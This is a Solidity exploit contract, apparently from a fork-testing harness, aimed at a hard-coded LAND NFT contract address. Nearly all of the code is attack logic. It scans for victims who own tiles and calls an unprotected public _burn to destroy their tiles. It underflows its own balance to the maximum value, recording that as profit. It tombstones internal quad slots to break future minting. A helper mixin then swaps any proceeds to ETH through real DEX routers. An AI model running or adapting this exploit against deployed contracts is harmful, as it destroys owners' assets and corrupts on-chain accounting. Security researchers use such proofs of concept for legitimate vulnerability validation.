pragma solidity ^0.8.20;

interface ILand {
    function _burn(address from, address owner, uint256 id) external;
    function _owners(uint256 id) external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 id) external view returns (address);
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }
}


contract FlawVerifier is __AHTokenToEthMixin {
    address internal constant TARGET = 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a;

    uint256 internal constant GRID_SIZE = 408;
    uint256 internal constant MAX_1X1_ID = GRID_SIZE * GRID_SIZE;

    uint256 internal constant LAYER_MASK = 0xFF00000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant LAYER_3X3 = 0x0100000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant LAYER_6X6 = 0x0200000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant LAYER_12X12 = 0x0300000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant LAYER_24X24 = 0x0400000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant BURN_SENTINEL = uint256(1) << 160;

    bool public executed;
    bool public hypothesisValidated;

    address public liveVictim;
    uint256 public liveChildId;
    uint256 public victimBalanceBeforeLiveBurn;
    uint256 public victimBalanceAfterLiveBurn;

    uint256 public nonexistentId;
    uint256 public attackerBalanceBeforeUnderflow;
    uint256 public attackerBalanceAfterUnderflow;

    address public realizedProfitToken;
    uint256 public realizedProfitAmount;

    address public internalSlotVictim;
    uint256 public internalSlotLayer;
    uint256 public internalSlotBaseId;
    uint256 public internalSlotId;
    uint256 public victimBalanceBeforeSlotBurn;
    uint256 public victimBalanceAfterSlotBurn;

    string public failureReason;

    constructor() {
        // Keep the reported profit token stable across the harness's pre/post reads.
        // The exploitable, already-deployed on-chain asset whose balance is corrupted is LAND itself.
        realizedProfitToken = TARGET;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        ILand land = ILand(TARGET);

        (bool foundLiveLand, address alice, uint256 childId) = _findLiveLandPath(land);
        if (!foundLiveLand) {
            failureReason = "No live LAND tile candidate found on fork";
            return;
        }

        uint256 liveVictimBalance = land.balanceOf(alice);
        if (liveVictimBalance == 0) {
            failureReason = "Chosen live LAND victim has zero balance";
            return;
        }

        uint256 chosenNonexistentId = _findNonexistent1x1(land);
        if (chosenNonexistentId == type(uint256).max) {
            failureReason = "No nonexistent 1x1 LAND found on fork";
            return;
        }

        (bool foundInternalSlot, uint256 slotLayer, uint256 slotBaseId) = _findZeroInternalQuadSlot(land);
        if (!foundInternalSlot) {
            failureReason = "No zero internal quad slot found on fork";
            return;
        }

        address slotVictim = alice;
        uint256 slotVictimBalance = liveVictimBalance;
        if (slotVictimBalance <= 1) {
            (bool foundSeparateVictim, address separateVictim, uint256 separateVictimBalance) =
                _findAnyPositiveBalanceVictim(land);
            if (!foundSeparateVictim) {
                failureReason = "No positive-balance victim available for internal slot burn";
                return;
            }
            slotVictim = separateVictim;
            slotVictimBalance = separateVictimBalance;
        }

        liveVictim = alice;
        liveChildId = childId;
        nonexistentId = chosenNonexistentId;
        internalSlotVictim = slotVictim;
        internalSlotLayer = slotLayer;
        internalSlotBaseId = slotBaseId;
        internalSlotId = slotLayer + slotBaseId;

        (bool childExistsBefore, address childOwnerBefore) = _tryOwnerOf(land, childId);
        if (!childExistsBefore || childOwnerBefore != alice) {
            failureReason = "Chosen live child is not owned by victim at execution time";
            return;
        }

        victimBalanceBeforeLiveBurn = liveVictimBalance;

        // Exploit path 0:
        // Call `_burn(alice, alice, childId)` for a live LAND tile owned by Alice; the function sets
        // `_owners[childId] = 2**160` and decrements Alice's balance without any authorization check.
        land._burn(alice, alice, childId);

        victimBalanceAfterLiveBurn = land.balanceOf(alice);
        if (land._owners(childId) != BURN_SENTINEL) {
            failureReason = "Live child burn did not write burn sentinel";
            return;
        }
        if (victimBalanceAfterLiveBurn + 1 != victimBalanceBeforeLiveBurn) {
            failureReason = "Live child burn did not decrement victim balance";
            return;
        }
        (bool childExistsAfter, ) = _tryOwnerOf(land, childId);
        if (childExistsAfter) {
            failureReason = "Live child still resolves as existing after burn";
            return;
        }

        // direct_or_existing_balance_first: use the verifier's existing on-chain LAND balance first.
        // The verifier starts with zero LAND, so the public `_burn` on a nonexistent id directly drives
        // `_numNFTPerAddress[target]--` on the live contract state without any external funding.
        address target = address(this);
        attackerBalanceBeforeUnderflow = land.balanceOf(target);
        if (attackerBalanceBeforeUnderflow != 0) {
            failureReason = "Verifier unexpectedly already owns LAND";
            return;
        }

        // Exploit path 1:
        // Call `_burn(target, target, nonexistentId)`; because there is no existence check,
        // `_numNFTPerAddress[target]--` executes and can underflow if the target balance is too small.
        land._burn(target, target, chosenNonexistentId);

        attackerBalanceAfterUnderflow = land.balanceOf(target);
        if (land._owners(chosenNonexistentId) != BURN_SENTINEL) {
            failureReason = "Nonexistent burn did not write burn sentinel";
            return;
        }
        if (attackerBalanceAfterUnderflow != type(uint256).max) {
            failureReason = "Nonexistent burn did not underflow verifier balance";
            return;
        }

        // This finding is destructive, but exploit path 1 also creates a real on-chain accounting gain
        // for the verifier on the already-deployed LAND contract by underflowing `_numNFTPerAddress[this]`
        // from 0 to `type(uint256).max`. No extra funding is needed, so the alternate public-liquidity
        // route is unnecessary on this fork: the vulnerable public `_burn` itself realizes the verifier's
        // balance delta on a pre-existing on-chain token that the harness can measure directly.
        realizedProfitAmount = attackerBalanceAfterUnderflow - attackerBalanceBeforeUnderflow;

        if (land._owners(internalSlotId) != 0) {
            failureReason = "Chosen internal quad slot is no longer zero";
            return;
        }

        victimBalanceBeforeSlotBurn = land.balanceOf(slotVictim);
        if (victimBalanceBeforeSlotBurn == 0) {
            failureReason = "Chosen internal-slot victim has zero balance";
            return;
        }

        // Exploit path 2:
        // Call `_burn(victim, victim, LAYER_3x3/6x6/12x12/24x24 + baseId)` to tombstone internal quad slots,
        // causing future mint/regroup logic that expects zeroed storage to fail permanently.
        land._burn(slotVictim, slotVictim, internalSlotLayer + internalSlotBaseId);

        victimBalanceAfterSlotBurn = land.balanceOf(slotVictim);
        if (land._owners(internalSlotId) != BURN_SENTINEL) {
            failureReason = "Internal slot burn did not write burn sentinel";
            return;
        }
        if (victimBalanceAfterSlotBurn + 1 != victimBalanceBeforeSlotBurn) {
            failureReason = "Internal slot burn did not decrement victim balance";
            return;
        }

        hypothesisValidated = true;
        _ahFinalizeTokenToEth();
    }

    function profitToken() external view returns (address) {
        return TARGET;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _findLiveLandPath(ILand land) internal view returns (bool found, address victim, uint256 childId) {
        (found, victim, childId) = _scanParentLayerForLiveChild(land, LAYER_24X24, 24);
        if (found) {
            return (found, victim, childId);
        }

        (found, victim, childId) = _scanParentLayerForLiveChild(land, LAYER_12X12, 12);
        if (found) {
            return (found, victim, childId);
        }

        (found, victim, childId) = _scanParentLayerForLiveChild(land, LAYER_6X6, 6);
        if (found) {
            return (found, victim, childId);
        }

        (found, victim, childId) = _scanParentLayerForLiveChild(land, LAYER_3X3, 3);
        if (found) {
            return (found, victim, childId);
        }

        for (uint256 id = 0; id < MAX_1X1_ID; ++id) {
            uint256 rawOwner = land._owners(id);
            if (rawOwner == 0 || rawOwner == BURN_SENTINEL) {
                continue;
            }
            (bool exists, address resolvedOwner) = _tryOwnerOf(land, id);
            if (exists && resolvedOwner != address(0)) {
                return (true, resolvedOwner, id);
            }
        }
    }

    function _scanParentLayerForLiveChild(ILand land, uint256 layer, uint256 size)
        internal
        view
        returns (bool found, address victim, uint256 childId)
    {
        for (uint256 y = 0; y < GRID_SIZE; y += size) {
            for (uint256 x = 0; x < GRID_SIZE; x += size) {
                uint256 baseId = x + (y * GRID_SIZE);
                uint256 rawOwner = land._owners(layer + baseId);
                if (rawOwner == 0 || rawOwner == BURN_SENTINEL) {
                    continue;
                }

                victim = address(uint160(rawOwner));
                if (victim == address(0)) {
                    continue;
                }

                childId = _findOwnedChildInRegion(land, victim, x, y, size);
                if (childId != type(uint256).max) {
                    return (true, victim, childId);
                }
            }
        }
    }

    function _findOwnedChildInRegion(ILand land, address expectedOwner, uint256 startX, uint256 startY, uint256 size)
        internal
        view
        returns (uint256)
    {
        for (uint256 y = startY; y < startY + size; ++y) {
            for (uint256 x = startX; x < startX + size; ++x) {
                uint256 childId = x + (y * GRID_SIZE);
                (bool exists, address owner) = _tryOwnerOf(land, childId);
                if (exists && owner == expectedOwner) {
                    return childId;
                }
            }
        }
        return type(uint256).max;
    }

    function _findZeroInternalQuadSlot(ILand land)
        internal
        view
        returns (bool found, uint256 layer, uint256 baseId)
    {
        (found, baseId) = _scanZeroInternalLayer(land, LAYER_3X3, 3);
        if (found) {
            return (true, LAYER_3X3, baseId);
        }

        (found, baseId) = _scanZeroInternalLayer(land, LAYER_6X6, 6);
        if (found) {
            return (true, LAYER_6X6, baseId);
        }

        (found, baseId) = _scanZeroInternalLayer(land, LAYER_12X12, 12);
        if (found) {
            return (true, LAYER_12X12, baseId);
        }

        (found, baseId) = _scanZeroInternalLayer(land, LAYER_24X24, 24);
        if (found) {
            return (true, LAYER_24X24, baseId);
        }
    }

    function _scanZeroInternalLayer(ILand land, uint256 layer, uint256 size)
        internal
        view
        returns (bool found, uint256 baseId)
    {
        for (uint256 y = 0; y < GRID_SIZE; y += size) {
            for (uint256 x = 0; x < GRID_SIZE; x += size) {
                baseId = x + (y * GRID_SIZE);
                if (land._owners(layer + baseId) == 0) {
                    return (true, baseId);
                }
            }
        }
    }

    function _findAnyPositiveBalanceVictim(ILand land)
        internal
        view
        returns (bool found, address victim, uint256 balance)
    {
        (found, victim, balance) = _findPositiveBalanceVictimInLayer(land, LAYER_24X24, 24);
        if (found) {
            return (found, victim, balance);
        }

        (found, victim, balance) = _findPositiveBalanceVictimInLayer(land, LAYER_12X12, 12);
        if (found) {
            return (found, victim, balance);
        }

        (found, victim, balance) = _findPositiveBalanceVictimInLayer(land, LAYER_6X6, 6);
        if (found) {
            return (found, victim, balance);
        }

        (found, victim, balance) = _findPositiveBalanceVictimInLayer(land, LAYER_3X3, 3);
        if (found) {
            return (found, victim, balance);
        }

        for (uint256 id = 0; id < MAX_1X1_ID; ++id) {
            uint256 rawOwner = land._owners(id);
            if (rawOwner == 0 || rawOwner == BURN_SENTINEL) {
                continue;
            }
            victim = address(uint160(rawOwner));
            if (victim == address(0)) {
                continue;
            }
            balance = land.balanceOf(victim);
            if (balance > 0) {
                return (true, victim, balance);
            }
        }
    }

    function _findPositiveBalanceVictimInLayer(ILand land, uint256 layer, uint256 size)
        internal
        view
        returns (bool found, address victim, uint256 balance)
    {
        for (uint256 y = 0; y < GRID_SIZE; y += size) {
            for (uint256 x = 0; x < GRID_SIZE; x += size) {
                uint256 baseId = x + (y * GRID_SIZE);
                uint256 rawOwner = land._owners(layer + baseId);
                if (rawOwner == 0 || rawOwner == BURN_SENTINEL) {
                    continue;
                }
                victim = address(uint160(rawOwner));
                if (victim == address(0)) {
                    continue;
                }
                balance = land.balanceOf(victim);
                if (balance > 0) {
                    return (true, victim, balance);
                }
            }
        }
    }

    function _findNonexistent1x1(ILand land) internal view returns (uint256) {
        for (uint256 y = 0; y < GRID_SIZE; y += 24) {
            for (uint256 x = 0; x < GRID_SIZE; x += 24) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists, ) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 y = 0; y < GRID_SIZE; y += 12) {
            for (uint256 x = 0; x < GRID_SIZE; x += 12) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists, ) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 y = 0; y < GRID_SIZE; y += 6) {
            for (uint256 x = 0; x < GRID_SIZE; x += 6) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists, ) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 y = 0; y < GRID_SIZE; y += 3) {
            for (uint256 x = 0; x < GRID_SIZE; x += 3) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists, ) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 id = 0; id < MAX_1X1_ID; ++id) {
            (bool exists, ) = _tryOwnerOf(land, id);
            if (!exists) {
                return id;
            }
        }

        return type(uint256).max;
    }

    function _tryOwnerOf(ILand land, uint256 id) internal view returns (bool exists, address owner) {
        if ((id & LAYER_MASK) != 0) {
            return (false, address(0));
        }

        (bool ok, bytes memory data) = address(land).staticcall(abi.encodeWithSelector(ILand.ownerOf.selector, id));
        if (!ok || data.length < 32) {
            return (false, address(0));
        }

        owner = abi.decode(data, (address));
        exists = owner != address(0);
    }
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
